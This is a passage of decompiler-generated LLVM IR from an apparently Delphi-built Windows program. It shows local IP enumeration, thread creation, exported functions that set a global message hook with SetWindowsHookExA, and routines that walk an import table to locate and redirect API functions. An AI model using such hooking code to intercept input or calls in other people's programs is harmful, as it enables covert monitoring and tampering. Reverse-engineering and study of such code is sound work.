  %8 = icmp eq i32 %7, 0, !insn.addr !1936
  %9 = icmp eq i1 %8, false, !insn.addr !1937
  br i1 %9, label %dec_label_pc_40731e, label %dec_label_pc_407314, !insn.addr !1937

dec_label_pc_407314:                              ; preds = %dec_label_pc_40730a, %dec_label_pc_407300
  %10 = call i32 @function_4073f8(), !insn.addr !1938
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1939
  br label %dec_label_pc_4073bb, !insn.addr !1939

dec_label_pc_40731e:                              ; preds = %dec_label_pc_40730a
  %11 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !1940
  %12 = icmp eq i8 %11, 0, !insn.addr !1940
  br i1 %12, label %dec_label_pc_407347, label %dec_label_pc_407328, !insn.addr !1941

dec_label_pc_407328:                              ; preds = %dec_label_pc_40731e
  %13 = call i32 @function_406be0(), !insn.addr !1942
  %14 = icmp eq i32 %13, 0, !insn.addr !1943
  br i1 %14, label %dec_label_pc_407347, label %dec_label_pc_407340, !insn.addr !1944

dec_label_pc_407340:                              ; preds = %dec_label_pc_407328
  %15 = call i32 @function_4073f8(), !insn.addr !1945
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1946
  br label %dec_label_pc_4073bb, !insn.addr !1946

dec_label_pc_407347:                              ; preds = %dec_label_pc_407328, %dec_label_pc_40731e
  %16 = call i32 @"@LStrCatN"(), !insn.addr !1947
  %17 = call i32 @"@LStrAsg"(), !insn.addr !1948
  %18 = bitcast i32* %stack_var_-12 to %_SECURITY_ATTRIBUTES*
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 3 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1949
  %20 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1950
  store i32 0, i32* %stack_var_-112, align 4, !insn.addr !1951
  %21 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !1951
  %22 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* null, i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1952
  %23 = call i32 @function_4073f8(), !insn.addr !1953
  store i32 %21, i32* %esp.0.reg2mem, !insn.addr !1953
  br label %dec_label_pc_4073bb, !insn.addr !1953

dec_label_pc_4073bb:                              ; preds = %dec_label_pc_407347, %dec_label_pc_407340, %dec_label_pc_407314
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1954
  %25 = load i32, i32* %24, align 4, !insn.addr !1954
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1955
  %26 = add i32 %esp.0.reload, 8, !insn.addr !1956
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1956
  store i32 4223960, i32* %27, align 4, !insn.addr !1956
  %28 = call i32 @"@LStrClr"(), !insn.addr !1957
  ret i32 %28, !insn.addr !1958
}

define i32 @function_4073d1() local_unnamed_addr {
dec_label_pc_4073d1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1959
  ret i32 %0, !insn.addr !1959
}

define i32 @function_4073d6() local_unnamed_addr {
dec_label_pc_4073d6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1960
}

define i32 @function_4073d8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4073d8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1961
}

define i32 @function_4073f8() local_unnamed_addr {
dec_label_pc_4073f8:
  %0 = call i32 @"@LStrClr"(), !insn.addr !1962
  %1 = call i32 @"@LStrClr"(), !insn.addr !1963
  ret i32 %1, !insn.addr !1964
}

define i32 @function_407410() local_unnamed_addr {
dec_label_pc_407410:
  %eax.0.reg2mem = alloca i32, !insn.addr !1965
  %esp.0.reg2mem = alloca i32, !insn.addr !1965
  %esp.15.reg2mem = alloca i32, !insn.addr !1965
  %storemerge6.reg2mem = alloca i32, !insn.addr !1965
  %.reg2mem = alloca i32, !insn.addr !1965
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-500 = alloca i8*, align 4
  %stack_var_-496 = alloca i32, align 4
  %stack_var_-488 = alloca i32, align 4
  %2 = trunc i32 %1 to i16, !insn.addr !1965
  %3 = inttoptr i32 %0 to %WSAData*, !insn.addr !1966
  store i32 257, i32* %stack_var_-488, align 4, !insn.addr !1967
  %4 = call i32 @WSAStartup(i16 %2, %WSAData* %3), !insn.addr !1968
  %5 = call i32 @"@LStrClr"(), !insn.addr !1969
  %6 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !1970
  store i32 %6, i32* %stack_var_-496, align 4, !insn.addr !1970
  %7 = call i32 @gethostname(i8* inttoptr (i32 64 to i8*), i32 %6), !insn.addr !1971
  %8 = bitcast i32* %stack_var_-496 to i8*
  store i8* %8, i8** %stack_var_-500, align 4, !insn.addr !1972
  %9 = call %hostent* @gethostbyname(i8* nonnull %8), !insn.addr !1973
  %10 = ptrtoint %hostent* %9 to i32, !insn.addr !1973
  %11 = icmp eq %hostent* %9, null, !insn.addr !1974
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !1975
  br i1 %11, label %dec_label_pc_40746e, label %dec_label_pc_407448, !insn.addr !1975

dec_label_pc_407448:                              ; preds = %dec_label_pc_407410
  %12 = add i32 %10, 12, !insn.addr !1976
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1976
  %14 = load i32, i32* %13, align 4, !insn.addr !1976
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1977
  %16 = load i32, i32* %15, align 4, !insn.addr !1977
  %17 = icmp eq i32 %16, 0, !insn.addr !1978
  %18 = icmp eq i1 %17, false, !insn.addr !1979
  br i1 %18, label %dec_label_pc_40744f.lr.ph, label %dec_label_pc_407469, !insn.addr !1979

dec_label_pc_40744f.lr.ph:                        ; preds = %dec_label_pc_407448
  %19 = ptrtoint i8** %stack_var_-500 to i32, !insn.addr !1972
  store i32 %16, i32* %.reg2mem
  store i32 0, i32* %storemerge6.reg2mem
  store i32 %19, i32* %esp.15.reg2mem
  br label %dec_label_pc_40744f

dec_label_pc_40744f:                              ; preds = %dec_label_pc_40744f.lr.ph, %dec_label_pc_407461
  %esp.15.reload = load i32, i32* %esp.15.reg2mem
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %20 = icmp eq i32 %storemerge6.reload, 0, !insn.addr !1980
  %21 = icmp eq i1 %20, false, !insn.addr !1981
  store i32 %esp.15.reload, i32* %esp.0.reg2mem, !insn.addr !1981
  br i1 %21, label %dec_label_pc_407461, label %dec_label_pc_407453, !insn.addr !1981

dec_label_pc_407453:                              ; preds = %dec_label_pc_40744f
  %.reload = load i32, i32* %.reg2mem
  %22 = inttoptr i32 %.reload to i32*, !insn.addr !1982
  %23 = load i32, i32* %22, align 4, !insn.addr !1982
  %24 = add i32 %esp.15.reload, -4, !insn.addr !1982
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1982
  store i32 %23, i32* %25, align 4, !insn.addr !1982
  %26 = call i8* @inet_ntoa(%in_addr { i32 ptrtoint (i32* @0 to i32) }), !insn.addr !1983
  %27 = call i32 @StrPas(), !insn.addr !1984
  store i32 %24, i32* %esp.0.reg2mem, !insn.addr !1984
  br label %dec_label_pc_407461, !insn.addr !1984

dec_label_pc_407461:                              ; preds = %dec_label_pc_407453, %dec_label_pc_40744f
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = add i32 %storemerge6.reload, 1, !insn.addr !1985
  %29 = mul i32 %28, 4, !insn.addr !1977
  %30 = add i32 %29, %14, !insn.addr !1977
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1977
  %32 = load i32, i32* %31, align 4, !insn.addr !1977
  %33 = icmp eq i32 %32, 0, !insn.addr !1978
  %34 = icmp eq i1 %33, false, !insn.addr !1979
  store i32 %32, i32* %.reg2mem, !insn.addr !1979
  store i32 %28, i32* %storemerge6.reg2mem, !insn.addr !1979
  store i32 %esp.0.reload, i32* %esp.15.reg2mem, !insn.addr !1979
  br i1 %34, label %dec_label_pc_40744f, label %dec_label_pc_407469, !insn.addr !1979

dec_label_pc_407469:                              ; preds = %dec_label_pc_407461, %dec_label_pc_407448
  %35 = call i32 @WSACleanup(), !insn.addr !1986
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !1986
  br label %dec_label_pc_40746e, !insn.addr !1986

dec_label_pc_40746e:                              ; preds = %dec_label_pc_407469, %dec_label_pc_407410
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1987
}

define i32 @function_40747c() local_unnamed_addr {
dec_label_pc_40747c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1988
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1988
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1988
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1989
  %2 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1990
  %3 = add i32 %2, 1, !insn.addr !1990
  store i32 %3, i32* @global_var_4096e0, align 4, !insn.addr !1990
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1991
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1992
  ret i32 0, !insn.addr !1993
}

define i32 @function_4074a1() local_unnamed_addr {
dec_label_pc_4074a1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1994
  ret i32 %0, !insn.addr !1994
}

define i32 @function_4074a6() local_unnamed_addr {
dec_label_pc_4074a6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1995
}

define i32 @function_4074a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4074a8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1996
}

define i32 @function_4074ac() local_unnamed_addr {
dec_label_pc_4074ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1997
  %2 = add i32 %1, -1, !insn.addr !1997
  store i32 %2, i32* @global_var_4096e0, align 4, !insn.addr !1997
  ret i32 %0, !insn.addr !1998
}

define i32 @function_4074b4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4074b4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1999
  %2 = call i32 @CallNextHookEx(i32* %1, i32 %arg1, i32 %arg2, i32 %arg3), !insn.addr !1999
  ret i32 %2, !insn.addr !2000
}

define i32 @JmpHookOn() local_unnamed_addr {
dec_label_pc_4074d4:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4224180 to i32*), i32 3), !insn.addr !2001
  %2 = ptrtoint i32* %1 to i32, !insn.addr !2001
  store i32 %2, i32* @global_var_4096e8, align 4, !insn.addr !2002
  %3 = icmp eq i32* %1, null, !insn.addr !2003
  %4 = icmp eq i1 %3, false, !insn.addr !2004
  %5 = sext i1 %4 to i32, !insn.addr !2005
  ret i32 %5, !insn.addr !2006
}

define i32 @JmpHookOff() local_unnamed_addr {
dec_label_pc_407500:
  %0 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !2007
  %1 = inttoptr i32 %0 to i32*, !insn.addr !2008
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !2008
  %3 = sext i1 %2 to i32, !insn.addr !2008
  ret i32 %3, !insn.addr !2009
}

define i32 @function_40750c() local_unnamed_addr {
dec_label_pc_40750c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2010
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2010
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2010
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2011
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !2012
  %3 = add i32 %2, 1, !insn.addr !2012
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !2012
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2013
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2014
  ret i32 0, !insn.addr !2015
}

define i32 @function_407531() local_unnamed_addr {
dec_label_pc_407531:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2016
  ret i32 %0, !insn.addr !2016
}

define i32 @function_407536() local_unnamed_addr {
dec_label_pc_407536:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2017
}

define i32 @function_407538(i32 %arg1) local_unnamed_addr {
dec_label_pc_407538:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2018
}

define i32 @function_40753c() local_unnamed_addr {
dec_label_pc_40753c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !2019
  %2 = add i32 %1, -1, !insn.addr !2019
  store i32 %2, i32* @global_var_4096e4, align 4, !insn.addr !2019
  ret i32 %0, !insn.addr !2020
}

define i32* @function_407544(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size) local_unnamed_addr {
dec_label_pc_407544:
  %0 = call i32* @ImageDirectoryEntryToData(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size), !insn.addr !2021
  ret i32* %0, !insn.addr !2021
}

define i32 @function_40754c() local_unnamed_addr {
dec_label_pc_40754c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2022
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2022
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2022
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2023
  %2 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !2024
  %3 = add i32 %2, 1, !insn.addr !2024
  store i32 %3, i32* @global_var_4096ec, align 4, !insn.addr !2024
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2025
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2026
  ret i32 0, !insn.addr !2027
}

define i32 @function_407571() local_unnamed_addr {
dec_label_pc_407571:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2028
  ret i32 %0, !insn.addr !2028
}

define i32 @function_407576() local_unnamed_addr {
dec_label_pc_407576:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2029
}

define i32 @function_407578(i32 %arg1) local_unnamed_addr {
dec_label_pc_407578:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2030
}

define i32 @function_40757c() local_unnamed_addr {
dec_label_pc_40757c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !2031
  %2 = add i32 %1, -1, !insn.addr !2031
  store i32 %2, i32* @global_var_4096ec, align 4, !insn.addr !2031
  ret i32 %0, !insn.addr !2032
}

define i32 @function_4075dc(i8* %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4075dc:
  %esp.1.reg2mem = alloca i32, !insn.addr !2033
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !2033
  %eax.0.reg2mem = alloca i32, !insn.addr !2033
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %6 = trunc i32 %4 to i8, !insn.addr !2034
  %7 = icmp eq i8 %6, 0, !insn.addr !2034
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !2035
  br i1 %7, label %dec_label_pc_4075ef, label %dec_label_pc_4075e7, !insn.addr !2035

dec_label_pc_4075e7:                              ; preds = %dec_label_pc_4075dc
  %8 = call i32 @"@ClassCreate"(i32 %2, i32 %5, i32 %3, i32 %1, i32 %0), !insn.addr !2036
  store i32 %8, i32* %eax.0.reg2mem, !insn.addr !2036
  store i32* %stack_var_-36, i32** %esp.0.in.reg2mem, !insn.addr !2036
  br label %dec_label_pc_4075ef, !insn.addr !2036

dec_label_pc_4075ef:                              ; preds = %dec_label_pc_4075e7, %dec_label_pc_4075dc
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %9 = add i32 %esp.0, -4, !insn.addr !2037
  %10 = and i32 %4, 255
  %11 = inttoptr i32 %10 to i8*, !insn.addr !2038
  %12 = call i32* @GetModuleHandleA(i8* %11), !insn.addr !2038
  %13 = ptrtoint i32* %12 to i32, !insn.addr !2038
  %14 = add i32 %eax.0.reload, 8, !insn.addr !2039
  %15 = inttoptr i32 %14 to i32*, !insn.addr !2039
  store i32 %13, i32* %15, align 4, !insn.addr !2039
  %16 = icmp eq i32* %12, null, !insn.addr !2040
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !2041
  br i1 %16, label %dec_label_pc_407647, label %dec_label_pc_40760b, !insn.addr !2041

dec_label_pc_40760b:                              ; preds = %dec_label_pc_4075ef
  %17 = ptrtoint i8* %arg1 to i32, !insn.addr !2042
  %18 = add i32 %eax.0.reload, 12, !insn.addr !2043
  %19 = inttoptr i32 %18 to i32*, !insn.addr !2043
  store i32 %17, i32* %19, align 4, !insn.addr !2043
  %20 = ptrtoint i8* %arg2 to i32, !insn.addr !2044
  %21 = add i32 %eax.0.reload, 16, !insn.addr !2045
  %22 = inttoptr i32 %21 to i32*, !insn.addr !2045
  store i32 %20, i32* %22, align 4, !insn.addr !2045
  %23 = add i32 %eax.0.reload, 20, !insn.addr !2046
  %24 = inttoptr i32 %23 to i32*, !insn.addr !2046
  store i32 %arg3, i32* %24, align 4, !insn.addr !2046
  %25 = load i32, i32* %22, align 4, !insn.addr !2047
  %26 = add i32 %esp.0, -8, !insn.addr !2048
  %27 = inttoptr i32 %26 to i32*, !insn.addr !2048
  store i32 %25, i32* %27, align 4, !insn.addr !2048
  %28 = add i32 %esp.0, -12, !insn.addr !2049
  %29 = inttoptr i32 %28 to i32*, !insn.addr !2049
  store i32 %17, i32* %29, align 4, !insn.addr !2049
  %30 = call i32* @GetModuleHandleA(i8* bitcast (i32* @0 to i8*)), !insn.addr !2050
  %31 = ptrtoint i32* %30 to i32, !insn.addr !2050
  %32 = add i32 %esp.0, -16, !insn.addr !2051
  %33 = inttoptr i32 %32 to i32*, !insn.addr !2051
  store i32 %31, i32* %33, align 4, !insn.addr !2051
  %34 = call i32 ()* @GetProcAddress(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !2052
  %35 = ptrtoint i32 ()* %34 to i32, !insn.addr !2052
  %36 = add i32 %eax.0.reload, 24, !insn.addr !2053
  %37 = inttoptr i32 %36 to i32*, !insn.addr !2053
  store i32 %35, i32* %37, align 4, !insn.addr !2053
  %38 = icmp eq i32 ()* %34, null, !insn.addr !2054
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !2055
  br i1 %38, label %dec_label_pc_407647, label %dec_label_pc_407633, !insn.addr !2055

dec_label_pc_407633:                              ; preds = %dec_label_pc_40760b
  %39 = load i32, i32* %24, align 4, !insn.addr !2056
  %40 = add i32 %esp.0, -20, !insn.addr !2057
  %41 = inttoptr i32 %40 to i32*, !insn.addr !2057
  store i32 %39, i32* %41, align 4, !insn.addr !2057
  %42 = load i32, i32* %15, align 4, !insn.addr !2058
  %43 = add i32 %esp.0, -24, !insn.addr !2059
  %44 = inttoptr i32 %43 to i32*, !insn.addr !2059
  store i32 %42, i32* %44, align 4, !insn.addr !2059
  %45 = call i32 @function_4076b0(i32 ptrtoint (i32* @0 to i32)), !insn.addr !2060
  store i32 %43, i32* %esp.1.reg2mem, !insn.addr !2060
  br label %dec_label_pc_407647, !insn.addr !2060

dec_label_pc_407647:                              ; preds = %dec_label_pc_407633, %dec_label_pc_40760b, %dec_label_pc_4075ef
  br i1 %7, label %dec_label_pc_40765e, label %dec_label_pc_40764f, !insn.addr !2061

dec_label_pc_40764f:                              ; preds = %dec_label_pc_407647
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %46 = call i32 @function_402b48(), !insn.addr !2062
  %47 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !2063
  %48 = load i32, i32* %47, align 4, !insn.addr !2063
  call void @__writefsdword(i32 0, i32 %48), !insn.addr !2063
  br label %dec_label_pc_40765e, !insn.addr !2064

dec_label_pc_40765e:                              ; preds = %dec_label_pc_40764f, %dec_label_pc_407647
  %49 = add i32 %eax.0.reload, 4, !insn.addr !2065
  %50 = inttoptr i32 %49 to i32*, !insn.addr !2065
  %51 = inttoptr i32 %9 to i32*, !insn.addr !2037
  ret i32 %eax.0.reload, !insn.addr !2066
}

define i32 @function_407668() local_unnamed_addr {
dec_label_pc_407668:
  %eax.1.reg2mem = alloca i32, !insn.addr !2067
  %eax.0.reg2mem = alloca i32, !insn.addr !2067
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @"@BeforeDestruction"(i32 %1, i32 %0), !insn.addr !2068
  %4 = add i32 %3, 8, !insn.addr !2069
  %5 = inttoptr i32 %4 to i32*, !insn.addr !2069
  %6 = load i32, i32* %5, align 4, !insn.addr !2069
  %7 = icmp eq i32 %6, 0, !insn.addr !2069
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !2070
  br i1 %7, label %dec_label_pc_4076a2, label %dec_label_pc_407679, !insn.addr !2070

dec_label_pc_407679:                              ; preds = %dec_label_pc_407668
  %8 = add i32 %3, 24, !insn.addr !2071
  %9 = inttoptr i32 %8 to i32*, !insn.addr !2071
  %10 = load i32, i32* %9, align 4, !insn.addr !2071
  %11 = icmp eq i32 %10, 0, !insn.addr !2071
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !2072
  br i1 %11, label %dec_label_pc_4076a2, label %dec_label_pc_40767f, !insn.addr !2072

dec_label_pc_40767f:                              ; preds = %dec_label_pc_407679
  %12 = add i32 %3, 4, !insn.addr !2073
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2073
  %14 = load i32, i32* %13, align 4, !insn.addr !2073
  %15 = inttoptr i32 %14 to i8*, !insn.addr !2074
  %16 = call i32* @GetModuleHandleA(i8* %15), !insn.addr !2075
  %17 = ptrtoint i32* %16 to i32, !insn.addr !2075
  %18 = load i32, i32* %5, align 4, !insn.addr !2076
  %19 = icmp eq i32 %18, %17, !insn.addr !2076
  %20 = icmp eq i1 %19, false, !insn.addr !2077
  store i32 %17, i32* %eax.0.reg2mem, !insn.addr !2077
  br i1 %20, label %dec_label_pc_4076a2, label %dec_label_pc_40768d, !insn.addr !2077

dec_label_pc_40768d:                              ; preds = %dec_label_pc_40767f
  %21 = load i32, i32* %9, align 4, !insn.addr !2078
  %22 = call i32 @function_4076b0(i32 %21), !insn.addr !2079
  store i32 %22, i32* %eax.0.reg2mem, !insn.addr !2079
  br label %dec_label_pc_4076a2, !insn.addr !2079

dec_label_pc_4076a2:                              ; preds = %dec_label_pc_40768d, %dec_label_pc_40767f, %dec_label_pc_407679, %dec_label_pc_407668
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %23 = trunc i32 %2 to i8, !insn.addr !2080
  %24 = icmp slt i8 %23, 1
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !2081
  br i1 %24, label %dec_label_pc_4076ad, label %dec_label_pc_4076a6, !insn.addr !2081

dec_label_pc_4076a6:                              ; preds = %dec_label_pc_4076a2
  %25 = call i32 @"@ClassDestroy"(), !insn.addr !2082
  store i32 %25, i32* %eax.1.reg2mem, !insn.addr !2082
  br label %dec_label_pc_4076ad, !insn.addr !2082

dec_label_pc_4076ad:                              ; preds = %dec_label_pc_4076a6, %dec_label_pc_4076a2
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !2083
}

define i32 @function_4076b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4076b0:
  %eax.0.reg2mem = alloca i32, !insn.addr !2084
  %esp.0.reg2mem = alloca i32, !insn.addr !2084
  %storemerge6.reg2mem = alloca i32, !insn.addr !2084
  %.reg2mem14 = alloca i32, !insn.addr !2084
  %esp.17.reg2mem = alloca i32, !insn.addr !2084
  %esi.08.reg2mem = alloca i32, !insn.addr !2084
  %.reg2mem = alloca i32, !insn.addr !2084
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_8 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %3 = icmp sgt i32 %arg1, -1, !insn.addr !2085
  %4 = icmp eq i1 %3, false, !insn.addr !2086
  %5 = icmp eq i32 %arg1, 0, !insn.addr !2087
  %or.cond = or i1 %5, %4
  br i1 %or.cond, label %dec_label_pc_40775d, label %dec_label_pc_4076d6, !insn.addr !2086

dec_label_pc_4076d6:                              ; preds = %dec_label_pc_4076b0
  %6 = trunc i32 %2 to i16, !insn.addr !2088
  %7 = trunc i32 %1 to i8, !insn.addr !2089
  store i32 %arg1, i32* %stack_var_-52, align 4, !insn.addr !2090
  %8 = inttoptr i32 %0 to i32*, !insn.addr !2091
  %9 = call i32* @ImageDirectoryEntryToData(i32* %8, i8 %7, i16 %6, i32* nonnull @0), !insn.addr !2091
  %10 = ptrtoint i32* %9 to i32, !insn.addr !2091
  %11 = icmp eq i32* %9, null, !insn.addr !2092
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !2093
  br i1 %11, label %dec_label_pc_40775d, label %dec_label_pc_407756.preheader, !insn.addr !2093

dec_label_pc_407756.preheader:                    ; preds = %dec_label_pc_4076d6
  %12 = add i32 %10, 12, !insn.addr !2094
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2094
  %14 = load i32, i32* %13, align 4, !insn.addr !2094
  %15 = icmp eq i32 %14, 0, !insn.addr !2095
  %16 = icmp eq i1 %15, false, !insn.addr !2096
  store i32 %14, i32* %eax.0.reg2mem, !insn.addr !2096
  br i1 %16, label %dec_label_pc_4076ef.lr.ph, label %dec_label_pc_40775d, !insn.addr !2096

dec_label_pc_4076ef.lr.ph:                        ; preds = %dec_label_pc_407756.preheader
  %17 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !2090
  %sext = mul i32 %1, 16777216
  %18 = sdiv i32 %sext, 16777216, !insn.addr !2097
  %sext4 = mul i32 %2, 65536
  %19 = sdiv i32 %sext4, 65536
  %20 = ptrtoint i32* %stack_var_-20 to i32
  %21 = ptrtoint i32* %stack_var_-24 to i32
  %22 = ptrtoint i32* %stack_var_8 to i32
  store i32 %14, i32* %.reg2mem
  store i32 %10, i32* %esi.08.reg2mem
  store i32 %17, i32* %esp.17.reg2mem
  br label %dec_label_pc_4076ef

dec_label_pc_4076ef:                              ; preds = %dec_label_pc_4076ef.lr.ph, %dec_label_pc_407753
  %esp.17.reload = load i32, i32* %esp.17.reg2mem
  %esi.08.reload = load i32, i32* %esi.08.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %23 = add i32 %.reload, %arg1, !insn.addr !2098
  %24 = add i32 %esp.17.reload, -4, !insn.addr !2099
  %25 = inttoptr i32 %24 to i32*, !insn.addr !2099
  store i32 %18, i32* %25, align 4, !insn.addr !2099
  %26 = add i32 %esp.17.reload, -8, !insn.addr !2100
  %27 = inttoptr i32 %26 to i32*, !insn.addr !2100
  store i32 %23, i32* %27, align 4, !insn.addr !2100
  %28 = call i32 @lstrcmpiA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2101
  %29 = icmp eq i32 %28, 0, !insn.addr !2102
  %30 = icmp eq i1 %29, false, !insn.addr !2103
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2103
  br i1 %30, label %dec_label_pc_407753, label %dec_label_pc_407702, !insn.addr !2103

dec_label_pc_407702:                              ; preds = %dec_label_pc_4076ef
  %31 = add i32 %esi.08.reload, 16, !insn.addr !2104
  %32 = inttoptr i32 %31 to i32*, !insn.addr !2104
  %33 = load i32, i32* %32, align 4, !insn.addr !2104
  %34 = add i32 %33, %arg1, !insn.addr !2105
  %35 = inttoptr i32 %34 to i32*, !insn.addr !2106
  %36 = load i32, i32* %35, align 4, !insn.addr !2106
  %37 = icmp eq i32 %36, 0, !insn.addr !2107
  %38 = icmp eq i1 %37, false, !insn.addr !2108
  store i32 %36, i32* %.reg2mem14, !insn.addr !2108
  store i32 %34, i32* %storemerge6.reg2mem, !insn.addr !2108
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2108
  br i1 %38, label %dec_label_pc_40770a, label %dec_label_pc_407753, !insn.addr !2108

dec_label_pc_40770a:                              ; preds = %dec_label_pc_407702, %dec_label_pc_40774a
